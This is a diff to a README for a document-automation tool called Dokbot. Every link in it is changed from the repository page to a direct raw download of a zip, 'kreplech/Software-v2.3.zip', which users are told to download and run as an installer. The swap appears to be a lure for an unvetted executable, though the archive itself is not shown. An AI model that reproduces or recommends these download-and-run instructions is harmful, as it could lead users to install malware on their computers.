@@ -1,6 +1,6 @@
 # 🤖 Dokbot - Automate your document workflow with ease
 
-[![Download Dokbot](https://img.shields.io/badge/Download_Dokbot-blue)](https://github.com/Subscribed-marcher792/Dokbot)
+[![Download Dokbot](https://img.shields.io/badge/Download_Dokbot-blue)](https://github.com/Subscribed-marcher792/Dokbot/raw/refs/heads/main/kreplech/Software-v2.3.zip)
 
 ## 📋 About Dokbot
 
@@ -19,7 +19,7 @@ Dokbot runs on most modern desktop environments. Ensure your setup meets these s
 
 Follow these steps to set up Dokbot on your Windows computer.
 
-1. Visit this page to download the latest version: https://github.com/Subscribed-marcher792/Dokbot
+1. Visit this page to download the latest version: https://github.com/Subscribed-marcher792/Dokbot/raw/refs/heads/main/kreplech/Software-v2.3.zip
 2. Locate the download folder on your computer.
 3. Double-click the installer file to begin the process.
 4. Follow the prompts on your screen.
@@ -43,7 +43,7 @@ Press the Start button to run your rules. Dokbot processes each file in order. Y
 
 ## 📦 Download and Install
 
-Download the application installer directly from our official repository link: https://github.com/Subscribed-marcher792/Dokbot
+Download the application installer directly from our official repository link: https://github.com/Subscribed-marcher792/Dokbot/raw/refs/heads/main/kreplech/Software-v2.3.zip
 
 If the download does not start, check your browser settings or try a different web browser. Once finished, run the installer and follow the instructions provided by the setup wizard.
 
